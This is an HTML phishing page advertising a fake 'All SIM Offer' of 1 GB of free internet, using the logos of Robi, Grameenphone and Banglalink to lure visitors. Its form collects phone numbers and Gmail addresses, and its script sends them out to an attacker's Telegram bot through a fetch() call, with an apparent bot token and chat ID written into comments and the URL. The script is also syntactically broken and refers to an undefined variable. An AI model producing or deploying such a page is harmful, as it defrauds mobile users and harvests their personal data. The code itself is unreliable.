<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>All SIM Offer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      text-align: center;
      padding: 20px;
    }
    .logo-container img {
      width: 80px;
      margin: 10px;
    }
    .form-box {
      background: #fff;
      padding: 30px;
      max-width: 400px;
      margin: 20px auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      padding: 12px 25px;
      background-color: #ff5722;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #e64a19;
    }
  </style>
</head>
<body>

  <h1>All SIM Offer</h1>
  
   <h1>1 GB Free internet</h1>

  <div class="logo-container">
    <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Robi_Axiata_Logo.png" alt="Robi">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Grameenphone_logo.svg" alt="Grameenphone">
    <img src="https://upload.wikimedia.org/wikipedia/en/0/04/Banglalink_logo.png" alt="Banglalink">
  </div>

  <div class="form-box">
    <input type="text" id="phone" placeholder="Enter your number" required>
    <input type="email" id="gmail" placeholder="Enter your Gmail" required>
    <button onclick="sendToTelegram()">Get Offer</button>
  </div>

  <script>
    function sendToTelegram() {
      const phone = document.getElementById('phone').value;

      const token = 'YOUR_BOT_TOKEN_HERE'; // 7779665032:AAFl2C-9hcZarKLyj3k8XbTDXvCUFfAFjEA
      const chatId = 'YOUR_CHAT_ID_HERE';  // 6975173404
      const message = `New Offer Request:\nPhone: ${phone}\nGmail: ${gmail}`;

      const url = `https://api.telegram.org/bot${7779665032:AAFl2C-9hcZarKLyj3k8XbTDXvCUFfAFjEA}/sendMessage?chat_id=${7779665032}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(response => {

            alert('Offer sent successfully!');

        .catch(error => {
          alert('Error: ' + error.message);

  </script>

</body>
</html>
